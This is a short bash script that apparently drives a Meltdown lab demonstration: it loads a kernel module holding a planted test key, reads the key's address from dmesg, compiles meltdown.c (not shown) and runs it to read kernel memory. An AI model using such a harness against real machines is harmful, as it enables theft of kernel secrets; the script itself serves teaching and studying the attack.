#!/bin/bash
echo "compile information:"
make
##sudo rmmod proc.ko
sudo insmod proc.ko
gcc -O2 -msse2 meltdown.c
address=`dmesg | grep "variable addr" | tail -c 17`
echo "================================================================================"
echo "================================================================================"
echo "run information:"
echo "The private key stored previously in the kernel space is 0x2333233323332333"
echo "The private key is stored at 0x$address"
sudo ./a.out $address
